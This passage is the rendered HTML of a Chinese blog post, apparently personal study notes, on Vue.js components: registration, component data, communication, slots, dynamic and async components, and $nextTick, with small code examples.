class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">value</span>)&#123;<br>                      <span class=\"hljs-keyword\">return</span> value&gt;<span class=\"hljs-number\">10</span>;<br>                  &#125;<br>              &#125;<br>              &#125;<br>          &#125;<br>      &#125;);<br></code></pre></td></tr></table></figure>\n\n<p>4.组件通信</p>\n<p>​    1.自定义事件：子组件向父组件传递数据</p>\n<p>​    2.双向绑定的v-model组件需要满足下面两个要求：</p>\n<p>​                *接受一个value属性</p>\n<pre><code class=\"hljs\">           *在有新的value前出发input事件\n</code></pre>\n<p>​    3.使用中央时间总线Bus实现父子，兄弟，跨级的组件间通信</p>\n<p>​    4.父链 this.$parent   this.$children  尽管Vue允许这样的操作，业务中，子组件应该尽可能避免以来父组件的数据（解耦？？）建议使用props和$emit</p>\n<p>​    5.子组件索引：通过$refs来获取子组件实现（注意：$refs只在组件渲染完成之后才填充，并且他是非响应式的。仅仅作为一个应急方案，应当避免再模板和计算属性中使用$refs）</p>\n<h3 id=\"4-使用slot分发内容\"><a href=\"#4-使用slot分发内容\" class=\"headerlink\" title=\"4.使用slot分发内容\"></a>4.使用slot分发内容</h3><p>当需要让组件组合使用，混合父组件的内容和子组件的模板时，用到slot，成为内容分发；</p>\n<p>props传递数据，events触发事件，slot内容分发构成了Vue组建的3个API来源；</p>\n<p>​    1.作用域</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">child-component</span>&gt;</span><br>\t&#123;&#123; message &#125;&#125;  //绑定父组件的数据<br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">child-component</span>&gt;</span><br><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">child-component</span> <span class=\"hljs-attr\">v-show</span>=<span class=\"hljs-string\">&quot;showMe&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">child-component</span>&gt;</span> //绑定的是父组件<br><br>var app=new Vue(&#123;<br>    el:&quot;#app&quot;,<br>    data:&#123;<br>    showMe: True;<br>&#125;<br>&#125;);<br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">child-component</span> <span class=\"hljs-attr\">v-show</span>=<span class=\"hljs-string\">&quot;showMe&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">child-component</span>&gt;</span> //绑定的是子组件<br><br>Vue.component(&#x27;child-component&#x27;,&#123;<br>template:&#x27;<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">v-show</span>=<span class=\"hljs-string\">&quot;showMe&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>&#x27;,<br>data:function()&#123;<br>\tretunr &#123;<br>\t\t\tshowMe:True<br>&#125;<br>&#125;<br>&#125;)<br><br></code></pre></td></tr></table></figure>\n\n<p>​    2.slot用法</p>\n<p>​                单个slot</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>       <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">child-component</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">child-component</span>&gt;</span><br><br>       <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">child-component</span>&gt;</span><br>           <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>Car~~<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br>   <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">child-component</span>&gt;</span><br>   <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br>   <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-handlebars\"><span class=\"language-xml\"></span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">       Vue.component(&#x27;child-component&#x27;, &#123;</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">           template: &quot;\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">           <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">               <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">slot</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">                   <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>您的购物车空空如也！<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">               <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">slot</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">           <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>&quot;,</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\"></span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">       &#125;);</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\"></span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">       var app = new Vue(&#123;</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">           el: &quot;#app&quot;,</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">       &#125;)</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">   </span></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>​                具名slot和单个slot混用</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">child-component</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">h2</span> <span class=\"hljs-attr\">slot</span>=<span class=\"hljs-string\">&quot;header&quot;</span>&gt;</span>此去经年<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">h2</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>从前车马很慢，书信很慢，一生只够爱一个人。<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">slot</span>=<span class=\"hljs-string\">&quot;footer&quot;</span>&gt;</span>Writted By GuiGui<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">child-component</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-handlebars\"><span class=\"language-xml\"></span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">        Vue.component(&#x27;child-component&#x27;, &#123;</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">            template: &#x27;\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">&quot;container&quot;</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">                <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">&quot;header&quot;</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">                    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">slot</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">&quot;header&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">slot</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">                <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">                <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">&quot;main&quot;</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">                    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">slot</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">slot</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">                <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">                <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">&quot;footer&quot;</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">                    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">slot</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">&quot;footer&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">slot</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">                <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">            <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>&#x27;,</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">        &#125;);</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\"></span></span><br></code></pre></td></tr></table></figure>\n\n<p>​    3.作用域插槽：使用一个可复用的模板替代已渲染元素。？？？</p>\n<p>​    4.访问slot：this.$slot.name;</p>\n<h3 id=\"5-组件高级用法\"><a href=\"#5-组件高级用法\" class=\"headerlink\" title=\"5.组件高级用法\"></a>5.组件高级用法</h3><p>​    1.递归组件：组件在他的模板内递归调用自己，只要给组件设置name即可；可以用于开发具未知层级关系的独立组件；</p>\n<p>​    注：必须设置一个条件来限制递归数量，否则抛出错误：max stack size exceeded;</p>\n<p>​    2.内联模板：给组件标签使用inline-template特性，组件会把它的内容当作模板；</p>\n<p>​    3.动态组件：vue.js提供了一个特殊元素&lt;component&gt;用来挂载不同的组件，使用is特性来选择需要挂载的组件</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>       <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">component</span> <span class=\"hljs-attr\">:is</span>=<span class=\"hljs-string\">&quot;currentChoose&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">component</span>&gt;</span><br>       <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> @<span class=\"hljs-attr\">click</span>=<span class=\"hljs-string\">&quot;handleChangeView(&#x27;A&#x27;)&quot;</span>&gt;</span>红灯<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br>       <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> @<span class=\"hljs-attr\">click</span>=<span class=\"hljs-string\">&quot;handleChangeView(&#x27;B&#x27;)&quot;</span>&gt;</span>黄灯<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br>       <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> @<span class=\"hljs-attr\">click</span>=<span class=\"hljs-string\">&quot;handleChangeView(&#x27;C&#x27;)&quot;</span>&gt;</span>绿灯<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br>   <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br><br>   <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\"></span><br><span class=\"language-javascript\"></span><br><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">       <span class=\"hljs-keyword\">var</span> app = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vue</span>(&#123;</span><br><span class=\"language-javascript\">           <span class=\"hljs-attr\">el</span>: <span class=\"hljs-string\">&quot;#app&quot;</span>,</span><br><span class=\"language-javascript\">           <span class=\"hljs-attr\">components</span>:&#123;</span><br><span class=\"language-javascript\">               <span class=\"hljs-attr\">comA</span>:&#123;</span><br><span class=\"language-javascript\">                   <span class=\"hljs-attr\">template</span>:<span class=\"hljs-string\">&#x27;&lt;div style=&quot;color: red;&quot;&gt;A组件&lt;/div&gt;&#x27;</span></span><br><span class=\"language-javascript\">               &#125;,</span><br><span class=\"language-javascript\">               <span class=\"hljs-attr\">comB</span>:&#123;</span><br><span class=\"language-javascript\">                   <span class=\"hljs-attr\">template</span>:<span class=\"hljs-string\">&#x27;&lt;div style=&quot;color: yellow;&quot;&gt;B组件&lt;/div&gt;&#x27;</span></span><br><span class=\"language-javascript\">               &#125;,</span><br><span class=\"language-javascript\">               <span class=\"hljs-attr\">comC</span>:&#123;</span><br><span class=\"language-javascript\">                   <span class=\"hljs-attr\">template</span>:<span class=\"hljs-string\">&#x27;&lt;div style=&quot;color: green;&quot;&gt;C组件&lt;/div&gt;&#x27;</span></span><br><span class=\"language-javascript\">               &#125;,</span><br><span class=\"language-javascript\">           &#125;,</span><br><span class=\"language-javascript\">           <span class=\"hljs-attr\">data</span>: &#123;</span><br><span class=\"language-javascript\">               <span class=\"hljs-attr\">currentChoose</span>:<span class=\"hljs-string\">&#x27;comA&#x27;</span>,</span><br><span class=\"language-javascript\">           &#125;,</span><br><span class=\"language-javascript\">           <span class=\"hljs-attr\">methods</span>: &#123;</span><br><span class=\"language-javascript\">               <span class=\"hljs-attr\">handleChangeView</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">component</span>)&#123;</span><br><span class=\"language-javascript\">                   <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">currentChoose</span>=<span class=\"hljs-string\">&#x27;com&#x27;</span>+component;</span><br><span class=\"language-javascript\">               &#125;,</span><br><span class=\"language-javascript\">           &#125;,</span><br><span class=\"language-javascript\">       &#125;)</span><br><span class=\"language-javascript\">   </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>​    4.异步组件：仅仅加载需要的组件，提高性能；（vue允许将组件定义为一个工厂函数，动态的解析组件，只在组件需要渲染时触发工厂函数，并且将结果缓存，用于再次渲染）</p>\n<h3 id=\"6其他\"><a href=\"#6其他\" class=\"headerlink\" title=\"6其他\"></a>6其他</h3><p>​    1.$nextTick 异步更新队列：vue仅仅会绘制最后一次改变，英雌因此当showtext=true的时候，其实还没有创建这个div，需要等到下一次刷新；</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>       <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;div&quot;</span> <span class=\"hljs-attr\">v-if</span>=<span class=\"hljs-string\">&quot;showText&quot;</span>&gt;</span>This is show me text;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br>       <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> @<span class=\"hljs-attr\">click</span>=<span class=\"hljs-string\">&quot;showMeText&quot;</span>&gt;</span>点击显示文本<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br>   <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br><br>   <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\"></span><br><span class=\"language-javascript\"></span><br><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">       <span class=\"hljs-keyword\">var</span> app = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vue</span>(&#123;</span><br><span class=\"language-javascript\">           <span class=\"hljs-attr\">el</span>: <span class=\"hljs-string\">&quot;#app&quot;</span>,</span><br><span class=\"language-javascript\">           <span class=\"hljs-attr\">data</span>: &#123;</span><br><span class=\"language-javascript\">               <span class=\"hljs-attr\">showText</span>: <span class=\"hljs-literal\">false</span></span><br><span class=\"language-javascript\">           &#125;,</span><br><span class=\"language-javascript\">           <span class=\"hljs-attr\">methods</span>: &#123;</span><br><span class=\"language-javascript\">               <span class=\"hljs-attr\">showMeText</span>: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) &#123;</span><br><span class=\"language-javascript\">                   <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">showText</span> = <span class=\"hljs-literal\">true</span>;</span><br><span class=\"language-javascript\">                   <span class=\"hljs-variable language_\">this</span>.$nextTick(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;</span><br><span class=\"language-javascript\">                       <span class=\"hljs-keyword\">var</span> text=<span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-title function_\">getElementById</span>(<span class=\"hljs-string\">&#x27;div&#x27;</span>).<span class=\"hljs-property\">innerHTML</span>;</span><br><span class=\"language-javascript\">                       <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(text);</span><br><span class=\"language-javascript\">                   &#125;);</span><br><span class=\"language-javascript\">               &#125;</span><br><span class=\"language-javascript\">           &#125;</span><br><span class=\"language-javascript\">       &#125;)</span><br><span class=\"language-javascript\">   </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>​    2.手动挂载实例$mount</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Ch7-组件详解\"><a href=\"#Ch7-组件详解\" class=\"headerlink\" title=\"Ch7 组件详解\"></a>Ch7 组件详解</h1><h3 id=\"1-组件的创建使用\"><a href=\"#1-组件的创建使用\" class=\"headerlink\" title=\"1.组件的创建使用\"></a>1.组件的创建使用</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-meta\">&lt;!DOCTYPE <span class=\"hljs-keyword\">html</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span> <span class=\"hljs-attr\">lang</span>=<span class=\"hljs-string\">&quot;en&quot;</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">charset</span>=<span class=\"hljs-string\">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">&quot;viewport&quot;</span> <span class=\"hljs-attr\">content</span>=<span class=\"hljs-string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">title</span>&gt;</span>Document<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">title</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;./js/vue.js&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">my-component1</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">my-component1</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">        <span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-title function_\">component</span>(<span class=\"hljs-string\">&#x27;my-component1&#x27;</span>,&#123;</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">template</span>:<span class=\"hljs-string\">&#x27;&lt;div&gt;&lt;p&gt;This is my component1&lt;/p&gt;&lt;/div&gt;&#x27;</span></span><br><span class=\"language-javascript\">        &#125;);</span><br><span class=\"language-javascript\"></span><br><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">        <span class=\"hljs-keyword\">var</span> app=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vue</span>(&#123;</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">el</span>:<span class=\"hljs-string\">&quot;#app&quot;</span>,</span><br><span class=\"language-javascript\">        &#125;);</span><br><span class=\"language-javascript\">    </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>注意： a.组件需要注册之后才可以使用；    b.组件template中必须被一个元素包含，如&lt;div&gt;&lt;/div&gt;</p>\n<p>​           c.组件可以使用data,methods,computed; data必须是函数，然后return；</p>\n<h3 id=\"2-组件数据的使用\"><a href=\"#2-组件数据的使用\" class=\"headerlink\" title=\"2.组件数据的使用\"></a>2.组件数据的使用</h3><p>三个组件都能实现自增,但是数据互不影响</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>       <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">my-component2</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">my-component2</span>&gt;</span><br>       <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">my-component2</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">my-component2</span>&gt;</span><br>       <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">my-component2</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">my-component2</span>&gt;</span><br>   <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br>   <br>     Vue.component(&#x27;my-component2&#x27;,&#123;<br>           template:&#x27;<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span>       <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>Counter:<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>&#123;&#123; count &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;button&quot;</span> @<span class=\"hljs-attr\">click</span>=<span class=\"hljs-string\">&quot;count++&quot;</span>&gt;</span>+1<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>&#x27;,<br>           data:function()&#123;<br>               return&#123;<br>                   count:0<br>               &#125; <br>           &#125;<br>       &#125;);<br></code></pre></td></tr></table></figure>\n\n<ol 